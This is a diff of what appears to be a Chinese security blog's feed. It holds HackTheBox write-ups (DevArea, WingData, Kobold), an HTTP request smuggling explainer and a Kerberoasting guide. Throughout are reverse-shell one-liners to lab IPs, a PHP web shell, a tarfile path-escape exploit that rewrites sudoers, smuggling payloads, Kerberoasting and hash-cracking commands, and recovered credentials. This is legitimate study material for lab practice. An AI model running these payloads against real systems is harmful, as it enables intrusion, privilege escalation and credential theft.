+eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYwNjk3ODAsImlhdCI6MTc3NTAyOTc4MCwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.S8b2IMAW6f8Thm7eFXz0Ul0JrxYeUBRt-5rBpAFL1QaRSsvJmg16Ov4B6DMZ5TZSXd1DxjHkSTCzf-fUar6bsQ
+
+Hoverfly远程代码执行 CVE-2025-54123poc:kasem545&#x2F;CVE-2025-54123-Poc：CVE-2025-54123 Hoverfly 认证中间件命令注入 RCE
+python3 cve-2025-54123.py -t http://10.129.207.190:8888 -u admin -p O7IJ27MyyXiU -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.23/1234 0&gt;&amp;1&quot;
+
+
+拿到shell
+
+flag 1:d22ae9c06aeaaa8ccaba6fea2bb98067
+提权sudo -l
+
+说明可以利用syswatch&#x2F;syswatch.sh执行root命令,
+&#x2F;bin&#x2F;bash可编写，并通过 Sudo 以 root 方式运行——当 syswatch 执行时，它会内部调用，这意味着我们可以用恶意脚本替代 bash
+
+以下复现：HackTheBox Season 10 DevArea 难度:Medium - 信息安全知识库
+备份 bash + 创建 payload（当前shell中执行）cp /usr/bin/bash /tmp/bash.bakcat &gt; /tmp/payload.sh &lt;&lt; &#x27;EOF&#x27;#!/tmp/bash.bak                      //用 /tmp/bash.bak 来解释执行cat /root/root.txt &gt; /tmp/root.txt   //把flag写入了/tmp/root.txtchmod 777 /tmp/root.txtcp /tmp/bash.bak /tmp/rootbashchmod +s /tmp/rootbashcp /tmp/bash.bak /usr/bin/bashexec /tmp/bash.bak &quot;$@&quot;              //用真正的 bash 执行当前收到的原始参数，并用它替换当前进程EOFchmod +x /tmp/payload.sh
+
+&lt;&lt; &#39;EOF&#39;带单引号，表示不要在当前 shell 里展开变量、命令替换，完全原样写入文件
+连接第二个shellpython3 -c &quot;import socket,subprocess,os;s=socket.socket();s.connect((&#x27;10.10.16.23&#x27;,9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#x27;/bin/dash&#x27;,&#x27;-i&#x27;])&quot;
 
 监听：
+nc -lvnp 9002
 
-拿到shell，进入ben用户
+执行权限提升kill -9 $(pgrep -x bash) 2&gt;/dev/null      //先杀所有 bash 进程，然后才执行为了释放对 bash 的占用dd if=/tmp/payload.sh of=/usr/bin/bash    //dd:直接把payload字节写进目标文件sudo /opt/syswatch/syswatch.sh --version  //以root执行payload.shcat /tmp/root.txt
 
-拿到flag 1：faa4cc3bf937add58bfde63015625d15
-提权拿到shell之后发现是一个docker
-进入shell之后，先扫一下端口：
+虽然 whoami 还显示 dev_ryan，但 payload 已经成功以 root 身份执行并把 flag 写入了 /tmp/root.txt
 
-LinPEAS它能自动搜索系统中可能存在的权限提升漏洞，包括错误配置的文件权限、敏感信息泄露、SUID&#x2F;SGID错误设置等，并通过醒目的颜色标记来突出显示潜在的安全风险。
-
-kali下载：
-wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
-
-shell转载：
-wget http://10.10.14.55:8000/linpeas.sh &amp;&amp; chmod 755 linpeas.sh &amp;&amp; ./linpeas.sh
-
-
-发现docker 挂在8080端口，找到一个子域名bin.kobold.htb
-
-查找PrivateBin 2.0.2漏洞，发现1.7.7至2.0.3版本前存在本地文件包含漏洞（可能导致代码执行），以及CVE-2024-39899的URL缩短绕过漏洞
-
-本地文件包含 (LFI) 漏洞 (影响 1.7.7 - &lt;2.0.3)：源于模板切换功能，攻击者可能利用此漏洞读取敏感文件或实现远程代码执行 (RCE)。
-URL 缩短服务滥用 (CVE-2024-39899)：通过代理机制，攻击者可以缩短任意 URL，绕过限制，该漏洞在 1.7.4 版本已修复。
-跨站脚本漏洞 (CVE-2020-5223)：早期版本中存在，通常已在后来的版本中修复。
-
-Privatebin - 本地 LFI漏洞
-（补充一句：信息搜集的方法，在github上搜这个服务，找他的Security模块，下面有对应版本范围的漏洞）
-
-https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82
-漏洞点：当站点启用了 templateselection 配置后，服务端会信任客户端提供的 template cookie，并把它当成模板名去拼接本地文件路径，随后执行 include，如果攻击者把 template cookie 改成带 ../ 的相对路径，就能从 tpl/ 目录向上跳，去包含别的本地 PHP 文件。 GHSA 明确指出这里允许 directory traversal，但只会拼出 .php 文件；绝对路径不行，要用相对于 tpl 目录的路径
-写码：
-cd /privatebin-data/dataecho &#x27;&lt;?php phpinfo();?&gt;&#x27; &gt; pwn.php
-
-然后构造如下请求包
-GET / HTTP/1.1Host: bin.kobold.htb......Cookie: template=../data/pwn 
-
-
-验证成功，写入shell(https://www.ddosi.org/shell/#bind)
-
-echo &#x27;&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.55 1111 &gt;/tmp/f&quot;);?&gt;&#x27; &gt; pwn4.php
-
-然后bp发包，kali监听
-
-拿到shell，但是没拿到root.txt
-
-信息搜集
-（这里整理一下：一开始通过mcpjam的漏洞版本找到cve，rce拿到第一个用户的shell，进入shell之后发现是在docker，扫发现bin子域名，发现PrivateBin漏洞，利用本地 LFI任意文件读取漏洞，在tmp目录下写码写shell,弹shell,拿到第二个用户，目前还有3552端口的Arcane没有利用，而Arcane需要登录，所以现在就要找用户名和密码）
-
-找到一个配置文件 &#x2F;srv&#x2F;cfg&#x2F;conf.php
-发现数据库名和密码：像是PrivateBin 对应 MySQL 数据库的账号密码
-
-用arcane  ComplexP@sswordAdmin1928 登录
-
-这是 Arcane 的 Docker 管理后台 &#x2F; 仪表盘（Dashboard）
-Arcane 1.13.0
-
-在bin这个容器里进行命令执行，发现&#x2F;root被禁（当前没root权限）
-新创建一个容器
-利用Docker 的默认行为：如果镜像里没有显式指定 USER，容器默认就以 root 运行
-
-路径配置
-
-安全性设置为特权模式
-
-
-进入这个docker，在shell里命令执行，此时的docker 拥有root权限
-
-拿到flag 2：8c6652b331e18fe098e5bfd7759528cf
-
-
+flag 2:33691ecec0ac0214836b4dbe565bed87
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -1442,7 +1537,7 @@ Arcane 1.13.0
       <tags>
         <tag>HTB</tag>
         <tag>靶场</tag>
-        <tag>Kobold</tag>
+        <tag>DevArea</tag>
       </tags>
   </entry>
   <entry>
@@ -2148,258 +2243,6 @@ evil-winrm -i 10.129.196.71 -u Administrator -H &#x27;ee238f6debc752010428f20875
       </tags>
   </entry>
   <entry>
-    <title>HTB WingData 靶场 Writeup</title>
-    <url>/2026/08/14/htb-wingdata/</url>
-    <content><![CDATA[Nmapnmap -sV 10.129.244.106
-
-
-22,80
-将机器主机名添加到本地主机文件中：
-echo &quot;10.129.244.106 wingdata.htb&quot; | sudo tee -a /etc/hosts
-
-10.129.244.106
-
-点击Client Portal 
-
-发现跳转到一个子域名ftp.wingdata.htb
-把这个域名加到本地
-echo &quot;10.129.244.106 ftp.wingdata.htb&quot; | sudo tee -a /etc/hosts
-
-
-这里复习了一下找子域名工具：Sublist3r，kali自带（这里不用）
-
-进入到一个登录页面：
-
-找一下cve：
-[CVE-2025-47812] Wing FTP Server v7.4.3
-Wing FTP 服务器存在未经身份验证的远程代码执行漏洞 [CVE-2025-47812]
-漏洞描述 ： &#x2F;loginok.html端点中不正确的 NULL 字节处理 允许通过 Lua 注入进行未经身份验证的远程代码执行
-
-Lua注入漏洞利用：
-在向loginok.html发起POST请求时，将一个空字节后跟Lua代码注入用户名中。成功认证后(即使匿名)，会返回一个UID Cookie。使用此UIDcookie对dir.html进行后续GET请求，触发注入的Lua代码执行，导致RCE。
-exp:https://www.exploit-db.com/exploits/52347
-poc:https://github.com/estebanzarate/CVE-2025-47812-Wing-FTP-Server-7.4.3-Unauthenticated-RCE-PoC
-
-拿到shell
-
-ls -lah 是 Linux 里很常用的查看目录内容命令
-
-
-然后在/opt/wftpserver/Data/1/users下的wacky.xml获得用户加密凭据
-
-但是这个poc只能进行命令执行，没有真正的拿到shell，不能文件读取
-
-换一个poc:
-4m3rr0r&#x2F;CVE-2025-47812-poc：Wing FTP 服务器远程代码执行（RCE）漏洞（CVE-2025-47812）
-
-然后反弹shell:
-python CVE-2025-47812.py -u http://ftp.wingdata.htb -c &quot;nc 10.10.15.166 8888 -e /bin/sh&quot; -v
-
-
-再读取/opt/wftpserver/Data/1/users下的wacky.xml
-cat /opt/wftpserver/Data/1/users/wacky.xml&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;USER_ACCOUNTS Description=&quot;Wing FTP Server User Accounts&quot;&gt;    &lt;USER&gt;        &lt;UserName&gt;wacky&lt;/UserName&gt;        &lt;EnableAccount&gt;1&lt;/EnableAccount&gt;        &lt;EnablePassword&gt;1&lt;/EnablePassword&gt;        &lt;Password&gt;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/Password&gt;        &lt;ProtocolType&gt;63&lt;/ProtocolType&gt;        &lt;EnableExpire&gt;0&lt;/EnableExpire&gt;        &lt;ExpireTime&gt;2025-12-02 12:02:46&lt;/ExpireTime&gt;        &lt;MaxDownloadSpeedPerSession&gt;0&lt;/MaxDownloadSpeedPerSession&gt;        &lt;MaxUploadSpeedPerSession&gt;0&lt;/MaxUploadSpeedPerSession&gt;        &lt;MaxDownloadSpeedPerUser&gt;0&lt;/MaxDownloadSpeedPerUser&gt;        &lt;MaxUploadSpeedPerUser&gt;0&lt;/MaxUploadSpeedPerUser&gt;        &lt;SessionNoCommandTimeOut&gt;5&lt;/SessionNoCommandTimeOut&gt;        &lt;SessionNoTransferTimeOut&gt;5&lt;/SessionNoTransferTimeOut&gt;        &lt;MaxConnection&gt;0&lt;/MaxConnection&gt;        &lt;ConnectionPerIp&gt;0&lt;/ConnectionPerIp&gt;        &lt;PasswordLength&gt;0&lt;/PasswordLength&gt;        &lt;ShowHiddenFile&gt;0&lt;/ShowHiddenFile&gt;        &lt;CanChangePassword&gt;0&lt;/CanChangePassword&gt;        &lt;CanSendMessageToServer&gt;0&lt;/CanSendMessageToServer&gt;        &lt;EnableSSHPublicKeyAuth&gt;0&lt;/EnableSSHPublicKeyAuth&gt;        &lt;SSHPublicKeyPath&gt;&lt;/SSHPublicKeyPath&gt;        &lt;SSHAuthMethod&gt;0&lt;/SSHAuthMethod&gt;        &lt;EnableWeblink&gt;1&lt;/EnableWeblink&gt;        &lt;EnableUplink&gt;1&lt;/EnableUplink&gt;        &lt;EnableTwoFactor&gt;0&lt;/EnableTwoFactor&gt;        &lt;TwoFactorCode&gt;&lt;/TwoFactorCode&gt;        &lt;ExtraInfo&gt;&lt;/ExtraInfo&gt;        &lt;CurrentCredit&gt;0&lt;/CurrentCredit&gt;        &lt;RatioDownload&gt;1&lt;/RatioDownload&gt;        &lt;RatioUpload&gt;1&lt;/RatioUpload&gt;        &lt;RatioCountMethod&gt;0&lt;/RatioCountMethod&gt;        &lt;EnableRatio&gt;0&lt;/EnableRatio&gt;        &lt;MaxQuota&gt;0&lt;/MaxQuota&gt;        &lt;CurrentQuota&gt;0&lt;/CurrentQuota&gt;        &lt;EnableQuota&gt;0&lt;/EnableQuota&gt;        &lt;NotesName&gt;&lt;/NotesName&gt;        &lt;NotesAddress&gt;&lt;/NotesAddress&gt;        &lt;NotesZipCode&gt;&lt;/NotesZipCode&gt;        &lt;NotesPhone&gt;&lt;/NotesPhone&gt;        &lt;NotesFax&gt;&lt;/NotesFax&gt;        &lt;NotesEmail&gt;&lt;/NotesEmail&gt;        &lt;NotesMemo&gt;&lt;/NotesMemo&gt;        &lt;EnableUploadLimit&gt;0&lt;/EnableUploadLimit&gt;        &lt;CurLimitUploadSize&gt;0&lt;/CurLimitUploadSize&gt;        &lt;MaxLimitUploadSize&gt;0&lt;/MaxLimitUploadSize&gt;        &lt;EnableDownloadLimit&gt;0&lt;/EnableDownloadLimit&gt;        &lt;CurLimitDownloadLimit&gt;0&lt;/CurLimitDownloadLimit&gt;        &lt;MaxLimitDownloadLimit&gt;0&lt;/MaxLimitDownloadLimit&gt;        &lt;LimitResetType&gt;0&lt;/LimitResetType&gt;        &lt;LimitResetTime&gt;1762103089&lt;/LimitResetTime&gt;        &lt;TotalReceivedBytes&gt;0&lt;/TotalReceivedBytes&gt;        &lt;TotalSentBytes&gt;0&lt;/TotalSentBytes&gt;        &lt;LoginCount&gt;2&lt;/LoginCount&gt;        &lt;FileDownload&gt;0&lt;/FileDownload&gt;        &lt;FileUpload&gt;0&lt;/FileUpload&gt;        &lt;FailedDownload&gt;0&lt;/FailedDownload&gt;        &lt;FailedUpload&gt;0&lt;/FailedUpload&gt;        &lt;LastLoginIp&gt;127.0.0.1&lt;/LastLoginIp&gt;        &lt;LastLoginTime&gt;2025-11-02 12:28:52&lt;/LastLoginTime&gt;        &lt;EnableSchedule&gt;0&lt;/EnableSchedule&gt;    &lt;/USER&gt;&lt;/USER_ACCOUNTS&gt;
-
-得到用户名和密码的hash：
-wacky
-32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
-爆破hash
-搜索salt
-grep -r -i &quot;salt&quot; /opt/wftpserver/Data
-
-
-找到salt为WingFTP
-
-注意参数：
-
-1400 &#x3D; SHA2-256
-1410 &#x3D; 带 salt 的 SHA256 格式
-
-
-hash.txt:
-32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
-
-爆破密码：
-hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
-
-
-密码：  !#7Blushing^*Bride5
-ssh连接ssh wacky@10.129.244.106
-
-连接成功，拿到flag 1 ：7216f65d9d41664d8725e6546ef01887
-
-提权
-有一个python脚本
-wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py#!/usr/bin/env python3import tarfileimport osimport sysimport reimport argparseBACKUP_BASE_DIR = &quot;/opt/backup_clients/backups&quot;STAGING_BASE = &quot;/opt/backup_clients/restored_backups&quot;def validate_backup_name(filename):    if not re.fullmatch(r&quot;^backup_\d+\.tar$&quot;, filename):        return False    client_id = filename.split(&#x27;_&#x27;)[1].rstrip(&#x27;.tar&#x27;)    return client_id.isdigit() and client_id != &quot;0&quot;def validate_restore_tag(tag):    return bool(re.fullmatch(r&quot;^[a-zA-Z0-9_]&#123;1,24&#125;$&quot;, tag))def main():    parser = argparse.ArgumentParser(        description=&quot;Restore client configuration from a validated backup tarball.&quot;,        epilog=&quot;Example: sudo %(prog)s -b backup_1001.tar -r restore_john&quot;    )    parser.add_argument(        &quot;-b&quot;, &quot;--backup&quot;,        required=True,        help=&quot;Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, &quot;             &quot;where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)&quot;    )    parser.add_argument(        &quot;-r&quot;, &quot;--restore-dir&quot;,        required=True,        help=&quot;Staging directory name for the restore operation. &quot;             &quot;Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). &quot;             &quot;Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).&quot;    )    args = parser.parse_args()    if not validate_backup_name(args.backup):        print(&quot;[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)&quot;, file=sys.stderr)        sys.exit(1)    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)    if not os.path.isfile(backup_path):        print(f&quot;[!] Backup file not found: &#123;backup_path&#125;&quot;, file=sys.stderr)        sys.exit(1)    if not args.restore_dir.startswith(&quot;restore_&quot;):        print(&quot;[!] --restore-dir must start with &#x27;restore_&#x27;&quot;, file=sys.stderr)        sys.exit(1)    tag = args.restore_dir[8:]    if not tag:        print(&quot;[!] --restore-dir must include a non-empty tag after &#x27;restore_&#x27;&quot;, file=sys.stderr)        sys.exit(1)    if not validate_restore_tag(tag):        print(&quot;[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores&quot;, file=sys.stderr)        sys.exit(1)    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)    print(f&quot;[+] Backup: &#123;args.backup&#125;&quot;)    print(f&quot;[+] Staging directory: &#123;staging_dir&#125;&quot;)    os.makedirs(staging_dir, exist_ok=True)    try:        with tarfile.open(backup_path, &quot;r&quot;) as tar:            tar.extractall(path=staging_dir, filter=&quot;data&quot;)        print(f&quot;[+] Extraction completed in &#123;staging_dir&#125;&quot;)    except (tarfile.TarError, OSError, Exception) as e:        print(f&quot;[!] Error during extraction: &#123;e&#125;&quot;, file=sys.stderr)        sys.exit(2)if __name__ == &quot;__main__&quot;:    main()
-
-漏洞点：
-tar.extractall(path=staging_dir, filter=&quot;data&quot;)
-
-
-
-它只校验了 备份文件名
-没有校验 tar 包内部成员
-直接对归档内容执行了解压
-
-Python 的 tarfile 文档里，filter=&quot;data&quot; 的设计目标确实是拒绝绝对路径、拒绝解压到目标目录外、并清理部分危险权限位。也就是它本来是“更安全的解压模式”。
-但问题在于，NVD 和 Red Hat 后续都记录了 Python 3.12+ 的 tarfile 提取过滤器相关漏洞：即使使用 filter=&quot;data&quot; 或 filter=&quot;tar&quot;，在处理不可信 tar 包时，仍可能发生越界写入提取目录之外的问题。
-所以，这段脚本的风险判断可以概括成一句话：
-如果攻击者能控制备份 tar 内容，而这个脚本又以更高权限运行，那么这里就是高风险点
-
-CVE-2025-4517poc:CVE-2025-4517-poc&#x2F;CVE-2025-4517.py at main · StealthByte0&#x2F;CVE-2025-4517-poc
-写入exp脚本：
-cat &gt; /tmp/exploit.py &lt;&lt;&#x27;PY&#x27;import tarfileimport osimport ioimport syscomp = &#x27;d&#x27; * 247steps = &quot;abcdefghijklmnop&quot;path = &quot;&quot;with tarfile.open(&quot;/tmp/backup_9999.tar&quot;, mode=&quot;w&quot;) as tar:    for i in steps:        a = tarfile.TarInfo(os.path.join(path, comp))        a.type = tarfile.DIRTYPE        tar.addfile(a)                b = tarfile.TarInfo(os.path.join(path, i))        b.type = tarfile.SYMTYPE        b.linkname = comp        tar.addfile(b)                path = os.path.join(path, comp)        linkpath = os.path.join(&quot;/&quot;.join(steps), &quot;l&quot;*254)    l = tarfile.TarInfo(linkpath)    l.type = tarfile.SYMTYPE    l.linkname = &quot;../&quot; * len(steps)    tar.addfile(l)        e = tarfile.TarInfo(&quot;escape&quot;)    e.type = tarfile.SYMTYPE    e.linkname = linkpath + &quot;/../../../../../../../etc&quot;    tar.addfile(e)        f = tarfile.TarInfo(&quot;sudoers_link&quot;)    f.type = tarfile.LNKTYPE    f.linkname = &quot;escape/sudoers&quot;    tar.addfile(f)        content = b&quot;wacky ALL=(ALL) NOPASSWD: ALL\n&quot;    c = tarfile.TarInfo(&quot;sudoers_link&quot;)    c.type = tarfile.REGTYPE    c.size = len(content)    tar.addfile(c, fileobj=io.BytesIO(content))print(&quot;[+] Exploit created&quot;)PY
-
-生成恶意 tar 文件
-python3 /tmp/exploit.py
-
-复制这个恶意的tar文件到sudo权限的目录下
-cp /tmp/backup_9999.tar /opt/backup_clients/backups/
-
-运行 sudo 脚本触发漏洞
-sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \  -b backup_9999.tar \              -r restore_evil
-
-
--b backup_9999.tar &#x3D; 指定要恢复的备份包名字是 backup_9999.tar
--r restore_evil &#x3D; 指定恢复到 restore_evil 这个目录
-
-
-sudo -l
-sudo su
-
-拿到flag 2： c1a6f37882dc5883a8dad98e0b2197aa
-
-]]></content>
-      <categories>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>HTB</tag>
-        <tag>靶场</tag>
-        <tag>WingData</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTTP 请求走私</title>
-    <url>/2026/08/14/http-request-smuggling/</url>
-    <content><![CDATA[HTTP请求走私是一种攻击技术，利用前端和后端服务器对HTTP请求的解析差异，将恶意请求夹带在合法请求中，从而绕过安全控制，访问敏感数据或攻击其他用户。
-漏洞原理：HTTP请求走私漏洞的产生主要是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：Content-Length头和Transfer-Encoding头。前端和后端服务器可能对这两种头的处理方式不同，从而导致请求边界的不同步。
-Content-Length头
-POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling
-
-Transfer-Encoding头
-POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0
-
-常见的HTTP请求走私类型
-
-CL-TE漏洞：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。
-TE-CL漏洞：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。
-TE-TE漏洞：前端和后端服务器都使用Transfer-Encoding头，但可以通过混淆头来诱导其中一台服务器不处理它。
-
-入口点:HTTP请求走私的攻击入口主要存在于前端代理服务器与后端应用服务器之间的连接链路上，常见的入口场景包括：
-1. 反向代理 &#x2F; 负载均衡器
-Nginx、Apache、HAProxy、F5、Cloudflare 等反向代理或负载均衡设备与后端 Tomcat、Jetty、Node.js 等应用服务器之间
-代理层负责连接复用（keep-alive），将多个前端请求复用到同一条后端 TCP 连接上
-
-2. CDN &#x2F; WAF 后端
-CDN 节点与源站服务器之间
-WAF（Web应用防火墙）仅检查前端可见的请求部分，走私的恶意请求被后端单独解析从而绕过 WAF 检测
-
-3. 支持 HTTP 管道化 &#x2F; 连接复用的网关
-API 网关、微服务网关（如 Kong、Zuul、Spring Cloud Gateway）
-任何将多个 HTTP 请求复用到同一后端 TCP 连接的中间件
-
-4. 常见可利用的页面&#x2F;接口
-登录接口、用户认证页面（可走私出其他用户的会话）
-搜索、评论等反射型输入点（可配合 XSS 扩大危害）
-静态资源缓存节点（可实施缓存投毒）
-
-
-利用思路:基本原理回顾
-攻击者构造一个包含两个请求边界的特制请求：前端服务器按一种方式解析（认为是一个请求），后端服务器按另一种方式解析（认为是两个请求），从而将第二个”隐藏请求”走私到后端。
-三类漏洞的利用方式CL-TE 漏洞（前端用CL，后端用TE）
-思路：前端根据 Content-Length 认为请求已结束，将完整请求转发给后端；后端按 Transfer-Encoding: chunked 解析，第一个 chunk 结束后，剩余内容被当作下一个独立请求处理
-利用：在请求体中嵌入第二个请求，后端会单独处理该走私请求
-
-POST / HTTP/1.1Host: target.comContent-Length: 50Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: target.comX: 
-
-TE-CL 漏洞（前端用TE，后端用CL）
-思路：前端按 chunked 解析，读到 0\r\n\r\n 认为请求结束；后端根据 Content-Length 判断请求长度，超出部分被拼接到下一个用户的请求前面
-利用：走私的请求前缀会污染下一个请求，影响其他用户
-
-POST / HTTP/1.1Host: target.comContent-Length: 4Transfer-Encoding: chunked5cGET /admin HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10
-
-TE-TE 漏洞（两端都用TE，但可混淆）
-思路：前后端都支持 chunked，但通过混淆 Transfer-Encoding 头（如加空格、大小写变体、重复头、前缀后缀），让其中一台服务器不识别该头，转而使用 Content-Length 或忽略
-常见混淆手法：
-Transfer-Encoding: xchunked（加前缀）
-Transfer-Encoding : chunked（冒号后多空格）
-Transfer-Encoding: chunked, identity（多值）
-重复的 Transfer-Encoding 头
-大小写变体：transfer-encoding、TRANSFER-ENCODING
-
-
-
-进阶利用场景
-
-
-利用场景
-说明
-
-
-
-绕过访问控制
-走私请求直接访问被前端&#x2F;WAF拦截的路径（如 &#x2F;admin）
-
-
-缓存投毒
-将恶意响应写入缓存，影响所有访问该缓存的用户
-
-
-会话劫持
-通过走私请求窃取其他用户的请求头中的 Cookie &#x2F; Token
-
-
-XSS 升级
-将反射型 XSS 转化为存储型&#x2F;扩散型危害
-
-
-凭据窃取
-走私请求诱导后端将下一个用户的请求内容返回给攻击者
-
-
-
-代码特点1. 同时存在两种长度标识请求中同时出现 Content-Length 和 Transfer-Encoding 头，且两端服务器对优先级处理不一致：
-
-有的服务器优先使用 Content-Length
-有的服务器优先使用 Transfer-Encoding
-有的服务器在两者共存时报错，有的则静默选择其中一个
-
-2. Transfer-Encoding 解析不严格后端代码对 Transfer-Encoding 头的解析存在宽松匹配问题：
-// 不安全的解析示例：未严格校验头格式if (header.contains(&quot;chunked&quot;)) &#123;    useChunked = true;&#125;// 应使用严格的 equals 或规范化后比较
-
-3. 前后端使用不同的 HTTP 解析库
-前端用 Nginx（C 语言解析），后端用 Tomcat（Java 解析）
-不同语言、不同库对 HTTP 规范的实现细节存在差异
-特别是对模糊边界情况（重复头、空格、大小写）的处理不一致
-
-4. 代理层未正确规范化请求头
-代理服务器在转发请求前，没有移除或规范化歧义的请求头
-安全的代理应在检测到 CL + TE 共存时，优先以 TE 为准并移除 CL，或直接拒绝请求
-
-5. Chunked 编码边界处理缺陷
-对 chunk size 的解析不严格（允许前导零、空白字符）
-对最后一个 chunk（0\r\n\r\n）的尾部处理不完善
-chunk 扩展字段（chunk extensions）处理逻辑存在漏洞
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>HTTP请求走私</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB Three 靶场 Writeup</title>
     <url>/2026/08/14/htb-three/</url>
     <content><![CDATA[HTB-Threeecho &quot;10.129.227.248 s3.thetoppers.htb&quot; | sudo tee -a /etc/hosts
@@ -2729,65 +2572,376 @@ nc -lvnp 1111
       </tags>
   </entry>
   <entry>
-    <title>攻击方式 - Kerberoasting</title>
-    <url>/2026/08/14/kerberoasting/</url>
-    <content><![CDATA[定义：攻击者通过正常域用户密码认证获取 TGT，利用该 TGT 请求指定 SPN 的 ST 时指定 易破解的 RC4_HMAC_MD5 加密类型。若 TGT 有效，KDC 会用注册该 SPN 的账户 Hash 加密 ST 返回，攻击者提取后可离线爆破出该账户明文密码，如果该服务在域内被配置为高权限运行，那么攻击者可能接管整个域。
-攻击条件：
-攻击者拥有一个有效的域用户账户和密码（能正常申请 TGT）
-目标服务账户在 AD 中注册了 SPN（Service Principal Name）
-攻击者网络可达域控（KDC），能与 88 端口通信
-服务账户密码强度较弱（可被字典爆破）
-不需要管理员权限，普通域用户即可请求任意 SPN 的 ST
-
-实战场景：在域环境里，拿到普通域用户权限后，找注册了 SPN 的服务账户，请求其 TGS 服务票据并离线爆破密码。
-攻击过程：查询域内注册于域用户下的SPN工具1：RiskySPNRiskySPN是一个PowerShell脚本的集合，专检测与SPN相关的账户是否滥用，自动识别弱密码服务票据
-# 1. 导入模块Import-Module .\RiskySPN.psm1# 2. 查询域内所有注册了 SPN 的用户账户Get-RiskySPN# 3. 自动识别弱密码服务票据（核心功能）Find-PotentiallyCrackableAccounts# 4. 请求指定 SPN 的 TGS 票据并导出 hash（hashcat 格式）Get-TGSCipher -SPN &quot;MSSQLSVC/server01.域名.com&quot; -Format hashcat# 5. 批量一键操作：查找 + 请求 + 导出所有可破解账户的 hashFind-PotentiallyCrackableAccounts | Get-TGSCipher -Format hashcat
-
-工具2：PowerView.ps1# 1. 导入 PowerView 模块Import-Module .\PowerView.ps1# 2. 查询所有注册了 SPN 的用户账户（最常用）Get-NetUser -SPN | select samaccountname, serviceprincipalname# 3. 新版 PowerView 命令（Dev 分支）Get-DomainUser -SPN | select samaccountname, serviceprincipalname
-
-请求指定SPN的STRuberus# 请求指定 SPN 的 ST + 导出 hashRubeus.exe kerberoast /spn:服务名/主机名.域名.com /outfile:hash.txt# 批量请求所有 SPNRubeus.exe kerberoast /outfile:hash.txt
-
-mimikatz# 请求指定 SPN 的 STkerberos::ask /target:服务名/主机名.域名.com# 导出所有票据kerberos::list /export
-
-GetUserSPNs.py# 请求指定 SPN 的 ST + 导出 hashpython GetUserSPNs.py 域名/用户名:密码 -request -spn 服务名/主机名.域名.com -outputfile hash.txt# 批量请求所有 SPNpython GetUserSPNs.py 域名/用户名:密码 -request -outputfile hash.txt
-
-导出请求的ST查看内存中的票据用cmd:
-Klist
-
-导出内存中的票据mimikatz：（在mimikatz同目录下直接导出.kirbi文件）
-kerberos::list /export
-
-补充：从 LSASS 内存中提取（mimikatz 另一种方式）
-# 从LSASS进程内存中提取所有Kerberos票据sekurlsa::kerberos /export
-
-
-这种方式需要管理员权限，能拿到所有登录用户的票据，包括别人的
-
-Rubeus  ：# 导出所有 Kerberos 票据（包括 ST）为 .kirbi 文件Rubeus.exe dump /outfile:tickets
-
-GetUserSPNs.py# 直接导出 hashcat 格式，不用 kirbi 中转python GetUserSPNs.py 域名/用户名:密码 -request -outputfile hash.txt
-
-离线爆破ST格式转换（kirbi → hashcat ）用 Rubeus 转换Rubeus.exe kerberoast /spn:服务名/主机名.域名.com /outfile:hash.txt
-
-用hashcat爆破用Rubeus或GetUserSPNs.py导出的hash.txt用以下命令：
-hashcat -m 13100 hash.txt rockyou.txt
-
-用 tgsrepcrack.py脚本 对mimikatz导出的.kirbi票据进行爆破：
-python tgsrepcrack.py rockyou.txt ticket.kirbi
+    <title>HTB Kobold 靶场 Writeup</title>
+    <url>/2026/08/14/htb-kobold/</url>
+    <content><![CDATA[Nmapnmap -sV 10.129.127.169 -A
 
 
 
+3个开放端口：SSH （22）、HTTP（80，重定向为HTTPS）、HTTPS （443）
+Ubuntu 上的 nginx 1.24.0
+通配符TLS证书——表示带有子域名的虚拟主机路由*.kobold.htb
+80号端口重定向至https://kobold.htb/
 
- AS-REP Roasting 的 hash，hashcat 用 -m 18200，Kerberoasting 的用 -m 13100，别搞混了  
+(将机器主机名添加到本地主机文件中：
+echo &quot;10.129.127.169 kobold.htb mcp.kobold.htb bin.kobold.htb&quot; | sudo tee -a /etc/hosts
+
+10.129.245.50   (一开始因为是https,所以证书不受信任，在 Firefox 里点 Advanced 后继续访问)
+
